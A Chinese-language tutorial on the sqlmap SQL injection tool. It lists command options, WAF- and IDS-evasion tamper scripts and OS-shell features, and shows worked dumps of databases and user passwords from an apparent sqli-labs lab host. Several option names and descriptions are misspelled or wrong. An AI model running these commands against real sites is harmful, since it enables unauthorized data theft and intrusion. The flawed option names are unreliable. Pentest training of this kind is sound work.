# sqlmap 使用指南

## 一、命令参数

### 1. 通用

| 参数            | 功能                                         |
| --------------- | -------------------------------------------- |
| -h              | 显示基本帮助信息                             |
| -hh             | 显示高级帮助信息                             |
| --version       | 显示版本号                                   |
| -s              | sqlite 会话文件保存位置                      |
| -t              | 记录所有 HTTP 流量到指定文件中               |
| --batch         | 测试过程中， 执行所有默认配置                |
| --charset       | 强制用于数据检索的字符编码                   |
| --crawl         | 从目标URL开始爬取网站                        |
| --crawl-exclude | 禁止爬取某个页面（eg：logout）               |
| --csv-del       | 指定CSV输出中使用的的字符                    |
| --dump-format   | 储存数据的方式（CSV(default)，HTML，SQLITE） |
| --flush-session | 刷新当前目标的会话文件                       |
| --fresh-queries | 忽略会话文件中储存的查询结果，重新查询       |
| --hex           | 使用DBMS hex函数进行数据检索                 |
| --outpout-dir   | 自定义输出目录                               |
| --save          | 保存选项到 ini 配置文件中                    |
| --scope         | 使用正则表达式从提供的日志中提取信息         |
| --alert         | 再找到SQL注入时运行主机操作系统命令          |
| --purge-output  | 安全的从输出目录中删除所有内容               |
| --sqlmap-shell  | 提示输入交互式sqlmap shell                   |
| --update        | 更新sqlmap                                   |

### 2. 信息显示设置

| 参数 | 功能                           |
| ---- | ------------------------------ |
| -h   | 设置显示信息等级（0-6 默认 1） |
| 0    | 只显示 Python 错误以及重要信息 |
| 1    | 显示信息以及警告               |
| 2    | 显示 debug 消息                |
| 3    | 显示注入 payload               |
| 4    | 显示 http 请求                 |
| 5    | 显示 http 响应头               |
| 6    | 显示 http 响应内容             |

### 3. 注入目标

| 参数 | 功能                              |
| ---- | --------------------------------- |
| -u   | 指定目标 url                      |
| -d   | 直接连接数据库                    |
| -l   | 从 BurpSuit 代理日志的解析目标    |
| -r   | 从文件中加载 http 请求            |
| -g   | 从 google dork 的结果作为目标 url |
| -c   | 从 ini 配置文件中加载选项         |

### 4. 请求头

| 参数              | 功能                                                         |
| ----------------- | ------------------------------------------------------------ |
| -A                | 指定 User-Agent 头                                           |
| -H                | 额外的 header                                                |
| -method           | 指定 HTTP 方法（GET/POST）                                   |
| --data            | 通过 POST 提交数据                                           |
| --param-del       | 指定参数分隔符                                               |
| --cookie          | 指定 cookie 的值                                             |
| --cookie-del      | 指定cookie分隔符                                             |
| --drop-set-cookie | 扔掉 response 中的 set-cookie 头                             |
| --random-agent    | 使用随机的 User-Agent 头                                     |
| --host            | 设置 host 头                                                 |
| --referer         | 指定 referer 头                                              |
| --headers         | 额外的headers                                                |
| --auth-type       | http认证类型（Basic，NTLM，Digest）                          |
| --auith-cred      | http认证凭证（账号：密码）                                   |
| --ignore-proxy    | 忽略系统代理（常用于扫描本地文件）                           |
| --proxy           | 使用代理                                                     |
| --proxy-cred      | 代理认证证书（账号：密码）                                   |
| --delay           | 设置两个请求之间延迟时间                                     |
| --timeout         | 超时时来连接前等待（默认 30）                                |
| --retries         | 连接超时时重试次数（默认 3）                                 |
| --randomize       | 随机更改指定的参数的值                                       |
| --safe-url        | 在测试期间经常访问的 URL                                     |
| --safe-post       | POST数据发送到安全的 URL                                     |
| --safe-freq       | 两次请求之间穿插一个安全的URL                                |
| --skip-urlencode  | 跳过 payload 数据的 URL 编码                                 |
| --chunked         | 使用 HTTP 分块传输加密 POST 请求                             |
| --hpp             | 使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）           |
| --force-ssl       | 强制使用 SSL/HTTPS                                           |
| --eval=value      | 请求之前提供Python代码（eg："import hashlib;id2=hashlib.md5(id).hexdigest()"） |

### 5. 优化参数

| 参数              | 功能                                    |
| ----------------- | --------------------------------------- |
| -o                | 打开所有优化开关                        |
| --predict-output  | 预测输出（与--threads不兼容）           |
| --keep-alive      | 建立长久的HTTP(S)连接 (与--proxy不兼容) |
| --null-connection | 空连接                                  |
| --threads=value   | 设置线程(默认 1)                        |

### 6. 注入参数

| 参数              | 功能                                   |
| ----------------- | -------------------------------------- |
| -p                | 指定测试参数                           |
| --skip            | 跳过指定参数的测试                     |
| --skip-static     | 跳过测试静态的参数                     |
| --dbms            | 指定具体DBMS                           |
| --os              | 指定DBMS操作系统                       |
| --invalid-bignum  | 使用大数字使值无效                     |
| --invalid-logical | 使用逻辑符使值无效                     |
| --invalid-string  | 使用字符串使值无效                     |
| --no-cast         | 关闭payload铸造机制                    |
| --no-escape       | 关闭字符转义机制（默认自动开启）       |
| --prefix          | 加入payload前缀                        |
| --suffix          | 加入payload后缀                        |
| --tamper          | 指定使用的脚本，多个脚本之间用空格隔开 |

### 7. 检测

| 参数         | 功能                                                  |
| ------------ | ----------------------------------------------------- |
| --level      | 指定测试的等级（1-5 默认为1）                         |
| --risk       | 指定测试的风险（0-3 默认为1）                         |
| --string     | 登录成功时，页面所含有的“关键字” 用于证明已经登录成功 |
| --not-string | 登录成功时，页面所含有的“关键字” 用于证明已经登录失败 |
| --code       | 查询为真时，匹配的HTTP代码                            |
| --smart      | 当有大量检测目标时，只选择基于错误的检测结果          |
| --text-only  | 仅基于文本内容比较网页                                |
| --titles     | 仅基于标题比较网页                                    |

### 8. 注入技术

| 参数         | 功能                                        |
| ------------ | ------------------------------------------- |
| -technique   | 指定sql注入技术（默认BEUSTQ）               |
| --time-sec   | 基于时间注入检测相应的延迟时间（默认为5秒） |
| --union-clos | 进行查询时，指定列的范围                    |
| --union-char | 指定暴力破解列数的字符                      |

| 参数 | 功能               |
| ---- | ------------------ |
| B    | 基于布尔的盲注     |
| T    | 基于时间的盲注     |
| E    | 基于报错的注入     |
| U    | 基于UNION查询注入  |
| S    | 基于多语句查询注入 |

### 9. 指纹查询

| 参数 | 功能                     |
| ---- | ------------------------ |
| -f   | 查询目标DBMS版本指纹信息 |

### 10. 数据查询

| 参数             | 功能                             |
| ---------------- | -------------------------------- |
| -a               | 查询所有                         |
| -b               | 查询目标 DBMS banner 信息        |
| --current-user   | 查询目标DBMS当前用户             |
| --current-db     | 查询目标 DBMS 当前数据库         |
| --is-dba         | 查询目标 DBMS 当前用户是否为 DBA |
| --users          | 枚举目标 DBMS 所有的用户         |
| --paswords       | 枚举目标 DBMS 用户密码哈希值     |
| --privileges     | 枚举目标 DBMS 用户的权限         |
| --roles          | 枚举DBMS用户的角色               |
| --dbs            | 枚举DBMS所有的数据库             |
| --tables         | 枚举DBMS数据库中所有的表         |
| --columns        | 枚举DBMS数据库表中所有的列       |
| --count          | 检索表的条目的数量               |
| --dump           | 存储DBMS数据库的表中的条目       |
| --dump-all       | 存储DBMS所有数据库表中的条目     |
| --D db           | 指定进行枚举的数据库名称         |
| --T  table       | 指定进行枚举的数据库表名称       |
| --C  column      | 指定进行枚举的数据库列名称       |
| --exclude-sysdbs | 枚举表时排除系统数据库           |
| --sql-query      | 指定查询的sql语句                |
| --sql-shell      | 提示输入一个交互式sql shell      |

### 11. 暴力破解

| 参数             | 功能       |
| ---------------- | ---------- |
| --common-tables  | 暴力破解表 |
| --common-colomns | 暴力破解列 |

### 12. 文件系统访问

| 参数          | 功能                                       |
| ------------- | ------------------------------------------ |
| --file-read   | 从目标数据库管理文件系统读取文件           |
| --file-write  | 上传文件到目标数据库管理文件系统           |
| --file-dest   | 指定写入文件的绝对路径                     |
| --os-cmd      | 执行操作系统命令                           |
| --os-shell    | 交互式的系统shell                          |
| --os-pwn      | 获取一个OOB shell，Meterpreter或者VNC      |
| --os-smbrelay | 一键 获取一个OOB shell，Meterpreter或者VNC |
| --os-bof      | 储存过程缓冲区溢出利用                     |
| --os-esc      | 数据库进程用户权限提升                     |
| --msf-path=   | Metasploit Framework本地安装路径           |

## 二、WAF 绕过

> WAF，即Web Application Firewall，即Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。

我们可以使用`--identify-waf`参数对一些网站是否有安全防护进行试探。当确定网站存在 WAF 之后我们需要对其进行绕过。

在 sqlmap 下的 tamper 目录中存放着绕过 WAF 脚本。通过 `--tamper` 参数使用脚本，多个 tamper 脚本之间用空格隔开。

### 1. 自带 tamper

在 Kali 2020 的系统中，tamper 文件夹位置为：`/usr/share/sqlmap/tamper`。

| 适用数据库                                                   | 模块                         | 功能                                                         | 环境                    |
| ------------------------------------------------------------ | ---------------------------- | ------------------------------------------------------------ | ----------------------- |
| ALL                                                          | apostrophemask.py            | 对单引号`'`用URL-UTF8编码                                    |                         |
| ALL                                                          | apostrophenullencode.py      | 对单引号`'`用非法的双UNICODE编码                             |                         |
| ALL                                                          | unmagicquotes.py             | 将单引号`'`替换成多个字节 并在结尾处添加注释符               |                         |
| ALL                                                          | escapequotes.py              | 斜杠转义单引号`'`和双引号`"`                                 |                         |
| ALL                                                          | base64encode.py              | 对payload进行一次BASE64编码                                  |                         |
| * Microsoft SQL Server 2000         * Microsoft SQL Server 2005         * MySQL 5.1.56         * PostgreSQL 9.0.3 | charunicodeencode.py         | 对payload进行一次URL-UNICODE编码                             | * ASP         * ASP.NET |
| ALL                                                          | charunicodeescape.py         | 对payload进行UNICODE格式转义编码                             |                         |
| ALL                                                          | htmlencode.py                | 对payload中非字母非数字字符进行HTML编码                      |                         |
| * Microsoft SQL Server 2005         * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0 | charencode.py                | 对payload进行一次URL编码                                     |                         |
| ALL                                                          | chardoubleencode.py          | 对payload进行两次URL编码                                     |                         |
| ALL                                                          | overlongutf8.py              | 将payload中非字母非数字字符用超长UTF8编码                    |                         |
| ALL                                                          | overlongutf8more.py          | 将payload中所有字符用超长UTF8编码                            |                         |
| * Microsoft SQL Server 2005         * MySQL 4, 5.0 and 5.5   | equaltolike.py               | 将payload中所有`=`替换成`LIKE`                               |                         |
| * MySQL 4, 5.0 and 5.5                                       | equaltorlike.py              | 将payload中所有`=`替换成`RLIKE`                              |                         |
| \* MySQL 5.1, SGOS                                           | bluecoat.py                  | 将SQL语句中空格字符`' '`替换为`%09` 并替换`=`为`LIKE`        |                         |
| * MSSQL         * SQLite                                     | space2dash.py                | 将空格字符`' '`替换成：`--`+随机字符串+`\n`                  |                         |
| \* MySQL                                                     | space2hash.py                | 将MySQL payload中空格字符`' '`替换成： `#`+随机字符串+`\n`   |                         |
| \* MySQL >= 5.1.13                                           | space2morehash.py            | 将MySQL payload中空格字符`' '`替换成： `#`+随机字符串+`\n`   |                         |
| * Microsoft SQL Server                                       | space2mssqlblank.py          | 将MsSQL payload中空格字符`' '`替换成 随机的空字符：(`%01`, `%02`, `%03`, `%04`···`%0F`) |                         |
| * MSSQL         * MySQL                                      | space2mssqlhash.py           | 将MySQL payload中空格字符`' '`替换成：`#`+`\n`               |                         |
| \* MySQL                                                     | space2mysqlblank.py          | 将MySQL payload中空格字符`' '`替换成 随机的空字符：(`%09`, `%0A`, `%0B`, `%0C`, `%0D`) |                         |
| * MySQL         * MSSQL                                      | space2mysqldash.py           | 将MySQL payload中空格字符`' '`替换成：`--`+`\n`              |                         |
| ALL                                                          | space2plus.py                | 将空格字符`' '`替换成`+`                                     |                         |
| * Microsoft SQL Server 2005         * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0 | space2randomblank.py         | 将空格字符`' '`替换成随机的空字符： (`%09`, `%0A`, `%0C`, `%0D`) |                         |
| * MySQL         * MsSQL                                      | 0eunion.py                   | `UNION`语句替换                                              |                         |
| ALL                                                          | unionalltounion.py           | `UNION`语句替换                                              |                         |
| \* MySQL                                                     | misunion.py                  | `UNION`语句替换                                              |                         |
| \* Oracle                                                    | dunion.py                    | `UNION`语句替换                                              |                         |
| \* MySQL                                                     | sleep2getlock.py             | `SLEEP`语句替换                                              |                         |
| * MySQL         * SQLite (possibly)         * SAP MaxDB (possibly) | ifnull2casewhenisnull.py     | `IFNULL`语句替换                                             |                         |
| * MySQL         * SQLite (possibly)         * SAP MaxDB (possibly) | ifnull2ifisnull.py           | `IFNULL`语句替换                                             |                         |
| \* MySQL                                                     | commalesslimit.py            | MySQL payload中`LIMIT`语句替换                               |                         |
| \* MySQL                                                     | commalessmid.py              | MySQL payload中`MID`语句替换                                 |                         |
| \* MySQL                                                     | hex2char.py                  | MySQL payload中`CONCAT(CHAR(),…)`语句替换                    |                         |
| * Microsoft SQL Server 2005         * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0 | between.py                   | 用`BETWEEN`语句替换`=<>`号                                   |                         |
| \* MySQL                                                     | concat2concatws.py           | MySQL payload中`CONCAT`语句替换                              |                         |
| * Microsoft SQL Server 2005         * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0 | space2comment.py             | 将空格字符`' '`替换成注释符`/**/`                            |                         |
| \* MySQL 5.0 and 5.5                                         | space2morecomment.py         | 将MySQL payload中空格字符`' '`替换成 注释符`/**_**/`         |                         |
| * Microsoft SQL Server         * MySQL         * Oracle         * PostgreSQL | commentbeforeparentheses.py  | 在括号前加上`/**/`注释                                       |                         |
| \* MySQL < 5.1                                               | halfversionedmorekeywords.py | 在关键字前添加MySQL版本注释信息                              |                         |
| \* MySQL                                                     | modsecurityversioned.py      | 用注释来包围完整的MySQL查询语句                              |                         |
| \* MySQL                                                     | modsecurityzeroversioned.py  | 用注释来包围完整的MySQL查询语句                              |                         |
| ALL                                                          | randomcomments.py            | 在SQL关键字的字符之间随机添加注释符                          |                         |
| \* MySQL                                                     | versionedkeywords.py         | 对MySQL payload中非函数的关键字进行注释                      |                         |
| * MySQL >= 5.1.13                                            | versionedmorekeywords.py     | 对MySQL payload中所有关键字进行注释                          |                         |
| \* Microsoft Access                                          | appendnullbyte.py            | 在payload结束位置加零字节字符`%00`                           |                         |
| \* MySQL                                                     | binary.py                    | 在payload可能位置插入关键字`binary`                          |                         |
| * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0 | greatest.py                  | `>`替换成`GREATEST`语句                                      |                         |
| * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0 | least.py                     | `>`替换成`LEAST`语句                                         |                         |
| ALL                                                          | informationschemacomment.py  | 在"information_schema"后面加上`/**/`                         |                         |
| * Microsoft SQL Server 2005         * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0 | lowercase.py                 | 将所有大写字符替换成小写字符                                 |                         |
| * Microsoft SQL Server 2005         * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0 | uppercase.py                 | 将所有小写字符替换成大写字符                                 |                         |
| ALL                                                          | multiplespaces.py            | 在SQL关键字旁添加多个空格符`' '`                             |                         |
| * Microsoft SQL Server 2000, 2005         * MySQL 5.1.56, 5.5.11         * PostgreSQL 9.0 | percentage.py                | payload中每个字符前加`%`                                     | \* ASP                  |
| \* Microsoft SQL Server 2012+                                | plus2concat.py               | 将`+`替换成MsSQL的`CONCAT()`语句                             |                         |
| \* Microsoft SQL Server 2008+                                | plus2fnconcat.py             | 将`+`替换成MsSQL的`{fn CONCAT()}`语句                        |                         |
| * Microsoft SQL Server 2005         * MySQL 4, 5.0 and 5.5         * Oracle 10g         * PostgreSQL 8.3, 8.4, 9.0         * SQLite 3 | randomcase.py                | 对每个SQL关键字的字符替换成随机大小写                        |                         |
| \* MySQL                                                     | schemasplit.py               | 拆分数据库标识符                                             |                         |
| \* MSSQL                                                     | sp_password.py               | 在MsSQL payload后添加`ssp_password` 用于混淆数据库日志       |                         |
| \* PostgreSQL 9.6.12                                         | substring2leftright.py       | 将PostgreSQL中`SUBSTRING`语句 用`LEFT`和`RIGHT`代替          |                         |
| ALL                                                          | symboliclogical.py           | 将`AND`和`OR`替换成`&&`和`||`                                |                         |
| ALL                                                          | luanginx.py                  | 针对LUA-Nginx WAF进行绕过                                    |                         |
| ALL                                                          | varnish.py                   | 添加一个HTTP头`X-originating-IP` 用来绕过Varnish防火墙       |                         |
| ALL                                                          | xforwardedfor.py             | 添加伪造的HTTP头`X-Forwarded-For`                            |                         |



## 三、使用小技巧

- 1. 注入的请求必须是正确的请求，例如测试登录时必须要使用能够正常登录的账号密码；
  2. 当我们知道哪里存在注入点时，我们可以在注入点加上 * 来标识这是一个注入点；

  ## 四、sqlmap 使用示例

  ### 1. 获取所有数据库
  
  ```bash
  Input:
  sqlmap -u "http://192.168.1.200:9080/Less-1/?id=1" --batch --dbs
  
  
  Output:
  ailable databases [5]:                                                                                                                                   
  [*] challenges
  [*] information_schema
  [*] mysql
  [*] performance_schema
  [*] security
  ```
  
  **参数解读：**
  
  - **-u**：指定测试的 url
  - **--batch**：使用所有默认选项
  - **--dbs**：获取所有数据库
  
  ### 2. 获取指定数据库的所有表
  
  ```bash
  Input:
  sqlmap -u "http://192.168.1.200:9080/Less-1/?id=1" --batch -D security --tables
  
  Output:
  Database: security                                                                                                                                         
  [4 tables]
  +----------+
  | emails   |
  | referers |
  | uagents  |
  | users    |
  +----------+
  ```
  
  ### 3. 获取指定表的所有列名
  
  ```bash
  Input:
  sqlmap -u "http://192.168.1.200:9080/Less-1/?id=1" --batch -D security -T users --columns
  
  
  Output:
  Database: security                                                                                                                            Table: users
  [3 columns]
  +----------+-------------+
  | Column   | Type        |
  +----------+-------------+
  | id       | int(3)      |
  | password | varchar(20) |
  | username | varchar(20) |
  +----------+-------------+
  ```
  
  ### 4. 获取指定列的值
  
  ```bash
  Input:
  sqlmap -u "http://192.168.1.200:9080/Less-1/?id=1" --batch -D security -T users -C "username,password" --dump  
  
  
  Output:
  Database: security                                                                                                                            Table: users
  [14 entries]
  +----------+----------+
  | username | password |
  +----------+----------+
  | Dumb     | password |
  | Angelina | password |
  | Dummy    | password |
  | secure   | password |
  | stupid   | password |
  | superman | password |
  | batman   | password |
  | admin    | 123      |
  | admin1   | password |
  | admin2   | password |
  | admin3   | password |
  | dhakkan  | password |
  | admin4   | password |
  | admin'#1 | 123      |
  +----------+----------+
  ```
  
  

